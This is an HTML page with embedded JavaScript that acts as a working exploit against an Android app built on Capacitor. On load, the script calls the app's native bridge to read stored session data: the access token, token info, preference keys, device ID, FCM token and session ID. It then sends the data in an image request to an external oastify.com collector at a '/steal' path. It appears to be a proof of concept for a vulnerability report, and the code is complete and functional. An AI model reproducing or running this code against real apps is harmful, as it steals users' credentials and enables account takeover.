<html>
<head><title>X</title></head>
<body>
<div id="s" style="display:none"></div>
<script>
var stolen = {};

window.Capacitor = {
  fromNative: function(d) {
    var cid = d.callbackId;
    var val = d.data ? d.data.value : null;

    if (cid === "t1" && val) {
      stolen.accessToken = val;
      document.getElementById("s").textContent += "Authorize: " + val.substring(0,40) + "...\n";
    }
    if (cid === "t2" && val) {
      stolen.tokenInfo = val;
      document.getElementById("s").textContent += "TokenInfo: " + val.substring(0,60) + "...\n";
    }
    if (cid === "t3") {
      stolen.keys = d.data ? JSON.stringify(d.data.keys) : null;
      document.getElementById("s").textContent += "Keys: " + stolen.keys + "\n";
    }
    if (cid === "t4" && val) {
      stolen.deviceId = val;
    }
    if (cid === "t5" && val) {
      stolen.fcm = val;
    }
    if (cid === "t6" && val) {
      stolen.sessionId = val;
    }

    if (stolen.accessToken) {
      var img = new Image();
      img.src = "https://b9lna30rpsgxcbr4hgm2so8tekkb81wq.oastify.com/steal?d=" + encodeURIComponent(JSON.stringify(stolen));
    }
  }
};

function call(id, key) {
  androidBridge.postMessage(JSON.stringify({
    type: "js.call",
    callbackId: id,
    pluginId: "Preferences",
    methodName: "get",
    options: { key: key }
  }));
}

function keys() {
  androidBridge.postMessage(JSON.stringify({
    type: "js.call",
    callbackId: "t3",
    pluginId: "Preferences",
    methodName: "keys",
    options: {}
  }));
}

setTimeout(function() {
  call("t1", "Authorize");
  call("t2", "tokenInfo");
  keys();
  call("t4", "deviceId");
  call("t5", "fcm-token");
  call("t6", "qpon_session_id");
}, 500);
</script>
</body>
</html>
